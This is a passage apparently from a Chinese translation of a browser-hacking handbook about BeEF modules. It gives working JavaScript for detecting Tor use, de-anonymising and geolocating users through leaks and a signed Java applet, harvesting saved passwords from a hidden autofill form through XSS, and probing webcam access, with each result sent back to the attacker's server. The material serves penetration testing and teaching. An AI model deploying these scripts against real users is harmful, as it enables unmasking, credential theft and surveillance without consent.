
```javascript
if ((typeof id == 'undefined') || (id == null)) {
  id = this.gen_hook_session_id();
  this.set_hook_session_id(id);
}
// return the hooked browser session identifier
return id;
}
```

虽然这不是直接可利用的漏洞，但值得注意的是，上网时不断留下的 Internet 活动痕迹。

## 绕过匿名化

作为攻击者，了解目标浏览器是否通过 Tor 来隐藏其流量可能很有价值。那么，如何检测这一点呢？

Tor 网络的一个有趣特性是任何人都可以提供隐藏服务（仅限于 Tor 网络内可访问）。这称为隐藏服务协议（Hidden Service Protocol），它实现服务器端匿名化，而非仅客户端端匿名化。关于隐藏服务协议的技术细节在此书范围之外，如需更多信息，可访问 [`www.torproject.org/docs/hidden-services.html.en`](https://www.torproject.org/docs/hidden-services.html.en)。

由于这些匿名化服务仅能在 Tor 网络内访问，它们为判断被钩住的浏览器是否使用 Tor 提供了方法。DeepSearch 是一个仅限 Tor 网络的搜索索引，其地址为 [`xycpusearchon2mc.onion`](http://xycpusearchon2mc.onion)。`.onion` 是伪顶级域名，用于标识 Tor 隐藏服务。虽然它看起来像合法顶级域名，但实际上并非如此，仅在正确配置本地代理并连接到 Tor 网络时才可访问。

DeepSearch 包含一个标题徽标，网址为 [`xycpusearchon2mc.onion/deeplogo.jpg`](http://xycpusearchon2mc.onion/deeplogo.jpg)，如果浏览器能够访问该图像，则表明浏览器正在 Tor 网络上。

BeEF 的“Detect Tor”模块通过执行以下 JavaScript 代码来检测 Tor 使用情况：

```javascript
var img = new Image();
img.setAttribute("style","visibility:hidden");
img.setAttribute("width","0");
img.setAttribute("height","0");
img.src = '<%= @tor_resource %>';
img.id = 'torimg';
img.setAttribute("attr","start");
img.onerror = function() {
  this.setAttribute("attr","error");
};
img.onload = function() {
  this.setAttribute("attr","load");
};
document.body.appendChild(img);
setTimeout(function() {
  var img = document.getElementById('torimg');
  if (img.getAttribute("attr") == "error") {
    beef.net.send('<%= @command_url %>',
      <%= @command_id %>,
      'result=Browser is not behind Tor');
  } else if (img.getAttribute("attr") == "load") {
    beef.net.send('<%= @command_url %>',
      <%= @command_id %>,
      'result=Browser is behind Tor');
  } else if (img.getAttribute("attr") == "start") {
    beef.net.send('<%= @command_url %>',
      <%= @command_id %>,
      'result=Browser timed out. \
       Cannot determine if browser is behind Tor');
  };
  document.body.removeChild(img);
}, <%= @timeout %>);
```

此代码首先创建一个指向 DeepSearch 徽标的 `<img>` 标签，其 URL 通过`@tor_resource`变量动态设置。随后为图像绑定两个事件处理程序：一个在加载成功时触发，另一个在加载失败时触发。最后将图像添加到文档的 body 中，从而向 DeepSearch 服务器提交请求。

`setTimeout()`函数用于在预定义的时间后检查图像的状态。默认情况下，`@timeout`变量设置为 10,000（即 10 秒）。当计时器结束后，代码会检查图像的状态，以判断其是否已加载。如果图像已加载，则说明浏览器处于 Tor 网络内。

如果浏览器使用的是像 Tor 这样的匿名化代理，那么尝试获取用户的真实 IP 地址可能会进一步泄露其私人信息。这可以通过多种方式实现。

第一种方法是强制浏览器向您控制的 DNS 服务器进行 DNS 请求。如果浏览器配置为通过 Tor 代理所有流量，但不代理 DNS 请求，这可能会泄露有价值的信息。与之前的示例相同，这可以通过简单地向 DOM 添加一个指向由您控制的 DNS 服务器解析的域名的 `<img>` 对象来实现。

第二种可以帮助你确定 IP 地址的技术是加载 Java Applet 或 Flash 文件。如果 Flash 或 Java 未配置为使用 Tor 代理，这些文件可能被构造为仅尝试查询攻击者控制的 Web 服务器上一个唯一图像或其他文件。如果插件未配置使用浏览器代理设置，这些请求可能会泄露目标的真实 IP。

另一种绕过匿名化的方法是使用 BeEF 的“获取实际位置”模块。该模块由 Keith Lee 开发，功能比单纯检测目标源 IP 更进一步。它会根据邻近的无线接入点使用封装在已签名 Java Applet 中的命令来获取地理位置信息。如果目标使用 Windows，Applet 会执行以下命令来获取所有邻近的无线网络：

```bash
netsh wlan show networks mode=bssid
```

如果目标使用 OS X，则命令为：

```bash
/System/Library/PrivateFrameworks/Apple80211.\
framework/Versions/Current/Resources/airport scan
```

执行这些命令后，Applet 会解析结果，提取 SSID、BSSID 和信号强度，并用于查询 Google Maps API（`https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&sensor=true`）。检测到的邻近无线网络越多，地理定位越准确。Google Maps API 可能还会返回街道地址详情以及 GPS 坐标。

利用此方法，只要目标允许已签名 Java Applet 运行，即使其浏览器在 Tor 或其他代理后面，也能被定位。Kyle Wilhoit 在 2013 年成功使用这种攻击手段确定了针对工业控制系统（ICS）设备的中国攻击者的实际位置。31 在 2013 年 BlackHat USA 讲话中，他公开了用于追踪攻击者的部分技术。这些技术中包括使用 ICS 蜜罐配合 BeEF，在攻击者的被钩挂浏览器上加载“检测 Tor”和“获取实际位置”模块。

## 攻击密码管理器

密码管理软件帮助用户存储和检索密码。密码管理器（在第 7 章中也有探讨）通常作为浏览器的原生功能被包含，也可以作为独立应用。密码管理器应用与浏览器集成的情况也很常见。遗憾的是，在很多情况下这些工具会暴露你的信息。许多网站在安全演进过程中会逐步启用安全特性。对密码管理器的主要防护措施是对表单元素的控制，特别是在密码提交时。这通常涉及添加`autocomplete="off"`标记，以防止浏览器缓存该表单字段。

Ben Towes 关于利用 XSS 漏洞滥用密码管理器的研究提出了一个良好的框架，用于攻击可能被缓存的表单字段。通过使用 JavaScript 库，即使表单元素已禁用自动填充（`autocomplete="off"`），仍然可以在存在 XSS 漏洞的页面上利用已保存的凭据。

要利用这种情况，你首先需要在目标页面中找到 XSS 向量。随后，确定用于用户名和密码的字段名称。确定字段名后，只需用 JavaScript 动态创建一个表单，等待片刻让浏览器自动填充，然后将数据发送回攻击者。

为简化执行，Towes 将上述逻辑封装到外部 JavaScript 文件中，以便在 XSS 攻击中直接引用。下面的代码示例使用了一个库，它会检查三种用户名字段变体：`user`、`username`、`un`；以及三种密码字段变体：`pass`、`password`、`pw`：

```javascript
function getCreds(){
  var users = new Array('user','username','un');
  var pass = new Array('pass','password','pw');
  un = pw = "";
  for( var i = 0; i < users.length; i++)
  {
    if (document.getElementById(users[i])) {
      un += document.getElementById(users[i]).value;
    }
  }
  for( var i = 0; i < pass.length; i++)
  {
    if (document.getElementById(pass[i])) {
      pw += document.getElementById(pass[i]).value;
    }
  }
  alert(un + "|" + pw);
  document.getElementById('myform').style.visibility='hidden';
  window.clearInterval(check);
}
document.write(" <div id='myform'> <form > <input type='text' name='user'");
document.write(" id='user' value='' autocomplete='on' size=1> <input ");
document.write("type='text' name='username' id='username' value='' ");
document.write("autocomplete='on' size=1> <input type='text' name='un'")
document.write(" id='un' value='' autocomplete='on' size=1> <input type=");
document.write("'password' name='pass' id='pass' value='' autocomplete='on'><br> <input type='password' name='password' id='password' ");
document.write("value='' autocomplete='on'><br> <input type='password' name='pw' id='pw' value='' autocomplete='on'><br> </form>");
document.write("</div>");
check = window.setInterval("getCreds()",100);
```

在本例中，需要在存在 XSS 漏洞的页面中通过 `<script>` 标签引入该 JavaScript 文件。代码会在 `<div>` 中创建一个隐藏的表单，并设置定时器每 100 ms 调用`getCreds()`。完成后，会弹出提示框显示用户名和密码（如图 5‑30 所示）。

<|ref|>start|>figure<|/ref|><|det|>[[50, 340, 490, 480]]<|/det|>

<|ref|>end|>figure

弹出提示框显示用户名和密码后，代码会隐藏表单。在真实场景中，你会改为使用`XMLHttpRequest` POST 请求将表单数据提交到目标站点。此示例在 Chrome 和 Firefox 中可用，但由于 Internet Explorer 将凭据绑定到页面而非源，效果会不佳。

Brendan Coles 的“获取存储凭据”模块在 BeEF 中使用类似逻辑，通过在 Firefox 浏览器中隐藏的 `<iframe>` 遍历所有密码表单输入，并将表单内容提交回 BeEF 服务器。

## 控制网络摄像头和麦克风

除了物理位置，浏览器还能披露其他敏感信息。如今许多电脑配备内置麦克风，甚至部分笔记本电脑内置摄像头。随着这类技术成本下降，以及笔记本厂商希望简化在线沟通，这类设备的普及程度可能成为新笔记本的默认配置。

BeEF 提供两个实验性模块，通过 Flash 与目标的摄像头交互。第一个是由 Ben Waugh 创作的“摄像头权限检查”模块（Webcam Permission Check），它会在后台透明地判断浏览器是否允许访问摄像头或麦克风。第二个是“摄像头”模块，它会尝试打开摄像头并拍摄多张照片。这两个模块都附带了一个预包装的 SWF 文件，该文件通过 JavaScript 函数与浏览器的 DOM 交互。为简化 SWF 的加载，BeEF 同时预加载了`swfobject.js`，它暴露了`swfobject.embedSWF()`函数。

在“摄像头权限检查”模块中，需要在加载 SWF 文件之前定义以下全局 JavaScript 函数：

- `noPermissions`
- `yesPermissions`
- `naPermissions`

另一个需要预定义的函数是`swfobject.embedSWF()`函数的回调函数；在此示例中是`swfobjectCallback`，如下所示：

```javascript
var swfobjectCallback = function(e) {
  if(e.success){
    beef.net.send("<%= @command_url %>",
      <%= @command_id %>,
      "result=Swfobject successfully added flash object \
       to the victim page");
  } else {
    beef.net.send("<%= @command_url %>",
      <%= @command_id %>,
      "result=Swfobject was not able to add the swf file \
       to the page. This could mean there was no flash \
       plugin installed.");
  }
}
```

此函数会向 BeEF 服务器报告 SWF 文件是否已加载。在调用`swfobject.embedSWF()`函数之前，`swfobject.js`必须正确加载到 DOM 中。jQuery 的`getScript()`函数可以帮助完成此类调用，它会获取远程脚本，并在下载成功后运行另一个函数。这优化了是否调用`swfobject.embedSWF()`函数，如下代码片段所示：

```javascript
$j.getScript(beef.net.httpproto+'://'+beef.net.host+
    ':'+beef.net.port+'/swfobject.js',
    function(data,txtStatus,jqxhr) {
      var flashvars = {};
      var parameters = {};
      parameters.scale = "noscale";
      parameters.wmode = "opaque";
      parameters.allowFullScreen = "true";
      parameters.allowScriptAccess = "always";
      var attributes = {};
      swfobject.embedSWF(
        beef.net.httpproto+'://'+beef.net.host+
        ':'+beef.net.port+'/cameraCheck.swf",
        "main", "1", "1", "9", "expressInstall.swf",
        flashvars, parameters, attributes, swfobjectCallback
      );
    }
);
```
